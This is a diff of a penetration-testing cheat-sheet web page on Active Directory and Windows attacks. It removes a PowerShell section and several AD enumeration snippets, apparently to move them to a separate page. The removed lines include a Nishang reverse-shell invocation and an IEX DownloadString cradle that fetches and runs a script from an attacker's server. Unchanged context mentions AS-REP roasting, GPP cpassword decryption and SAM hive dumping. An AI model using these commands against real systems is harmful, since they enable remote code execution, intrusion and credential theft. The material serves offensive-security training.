@@ -101,12 +101,6 @@
     
         <li><a class="" href="#kerberos-preauthentication">Kerberos preauthentication</a></li>
     
-        <li><a class="" href="#list-deleted-users">List deleted users</a></li>
-    
-        <li><a class="" href="#get-user-owner">Get user owner</a></li>
-    
-        <li><a class="" href="#collect-ad-users-information">Collect AD users information</a></li>
-    
         <li><a class="" href="#decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</a></li>
     
         <li><a class="" href="#use-win32-api-in-python">Use Win32 API in Python</a></li>
@@ -120,8 +114,6 @@
         <li><a class="" href="#sam-and-system-backup">SAM and SYSTEM backup</a></li>
     
         <li><a class="" href="#calculate-ntlm-hash">Calculate NTLM hash</a></li>
-    
-        <li><a class="" href="#list-email-aliases">List Email aliases</a></li>
     
         <li><a class="" href="#truster-account">Truster Account</a></li>
     
@@ -139,12 +131,15 @@
     
         <li><a class="" href="#user-enumeration">User enumeration</a></li>
     
-        <li><a class="" href="#powershell">PowerShell</a></li>
-    
     </ul>
     
 
     </ul>
+          </li>
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="../powershell/">Powershell</a>
           </li>
           
           <li class="bold">
@@ -402,48 +397,6 @@ to get the TGT in a format that <code>John</code> or <code>Hashcat</code> can br
 </code></pre>
 
 <p>From <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank">@harmj0y</a>.</p>
-<h3 id="list-deleted-users">List deleted users</h3>
-<pre><code class="language-powershell line-numbers">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
-$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter &quot;(objectClass=user)&quot; -IncludeDeletedObjects -properties *
-foreach ($object in $objects) { $object }
-</code></pre>
-
-<h3 id="get-user-owner">Get user owner</h3>
-<pre><code class="language-powershell line-numbers">Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
-</code></pre>
-
-<h3 id="collect-ad-users-information">Collect AD users information</h3>
-<pre><code class="language-powershell line-numbers"># Helping functions
-function Get-ADUserDirectoryEntry($user) {
-    return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(samAccountName=$user))&quot;)).FindOne().GetDirectoryEntry()
-}
-
-function Get-ADUserGroups($user) {
-    $userDirectoryEntry = Get-ADUserDirectoryEntry($user)
-    $groups = $userDirectoryEntry.memberOf
-
-    return $groups
-}
-
-function Get-ADGroupMembers($GroupName) {
-    if ($GroupName -like &quot;CN=*&quot;) {
-        $GroupDistinguishedName = $GroupName
-    } else {
-        # find the distinguished name from the group name
-        $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=Group)(cn=$GroupName))&quot;)).FindOne().GetDirectoryEntry().distinguishedName
-    }
-
-    # limited to the first 10k entries
-    $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(memberOf=$GroupDistinguishedName ))&quot;)).FindAll()
-
-    return $GroupMembers.properties
-}
-
-# Get &quot;Domain admins&quot; users, be carefull the name may change depending on the DC lang
-$DomainAdmins = Get-ADGroupMembers(&quot;Domain Admins&quot;)
-foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samaccountname))&quot; }
-</code></pre>
-
 <h3 id="decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</h3>
 <p>Some <code>Group Policy Preferences</code> (GPP) GPO stored at <code>\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>
 contains an account credentials for administration on a remote host.
@@ -491,10 +444,6 @@ $ reg save HKLM\SAM SamBkup.hiv
 <pre><code class="language-python line-numbers">import hashlib
 pwd = &quot;password&quot;
 print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
-</code></pre>
-
-<h3 id="list-email-aliases">List Email aliases</h3>
-<pre><code class="language-powershell line-numbers">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
 </code></pre>
 
 <h3 id="truster-account">Truster Account</h3>
@@ -583,64 +532,6 @@ with <code>rpcclient</code>:</p>
 rpcclient $&gt; enumdomusers
 rpcclient $&gt; queryuser &lt;user&gt;
 </code></pre>
-
-<h2 id="powershell">PowerShell</h2>
-<p>Some useful PowerShell commands that you can use during your recon or privsec phases.</p>
-<h3 id="get-powershell-command-history">Get PowerShell command history</h3>
-<pre><code class="language-powershell line-numbers">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
-gc ConsoleHost_history.txt
-</code></pre>
-
-<h3 id="execute-block-as-an-other-user">Execute block as an other user</h3>
-<pre><code class="language-powershell line-numbers">$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;dom&gt;\&lt;username&gt;&quot;, $pass)
-Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { cmd.exe &quot;/c &lt;cmd&gt;&quot; }
-</code></pre>
-
-<h3 id="download-and-execute-script">Download and execute script</h3>
-<p>The repository <a href="https://github.com/samratashok/nishang" target="_blank">Nishang</a> contains a good
-PowerShell script to create a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">reverse shell</a>.
-You need to add the following line at the end:</p>
-<pre><code class="language-powershell line-numbers">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
-</code></pre>
-
-<p>On your local machine:</p>
-<ul>
-<li>Create an HTTP server to serve the script: <code>python -m http.serve</code></li>
-<li>Listen for an incoming <a href="../reverse-shell/#listen-with-netcat">connection with nc</a>.</li>
-</ul>
-<p>On the remote host, execute the following PowerShell script:</p>
-<pre><code class="language-powershell line-numbers">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
-</code></pre>
-
-<h3 id="get-domain-password-policy">Get Domain Password Policy</h3>
-<pre><code class="language-powershell line-numbers">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
-</code></pre>
-
-<h3 id="convert-dacl">Convert DACL</h3>
-<pre><code class="language-powershell line-numbers">$acl = get-acl HKLM:\System\CurrentControlSet\Services
-ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
-</code></pre>
-
-<h3 id="execute-dll">Execute DLL</h3>
-<pre><code class="language-powershell line-numbers"># Load a dll to Powershell
-[Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Service.dll&quot;)
-[Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Cryptography.dll&quot;)
-
-# Call a public public static method
-[MyNamespace.Service.Config]::ApplicationKey()
-
-# Instantiate a class and class a method
-$c = New-Object MyNamespace.Cryptography.MyCryptography
-$c.Decrypt(&quot;CIPHER_TEXT&quot;, [MyNamespace.Service.Config]::ApplicationKey())
-</code></pre>
-
-<h3 id="list-tcp-connections">List TCP connections</h3>
-<p>The <a href="https://docs.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=win10-ps" target="_blank"><code>Get-NetTCPConnection</code></a>
-cmdlets lists TCP connections. By default the processes pid is return, so the
-following command line select the process name instead.</p>
-<pre><code class="language-powershell line-numbers">Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).CommandLine}} | Format-Table -AutoSize
-</code></pre>
             
           </div>
           <footer>
@@ -662,7 +553,7 @@ following command line select the process name instead.</p>
         <span><a href="../kubernetes/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../linux/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../powershell/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
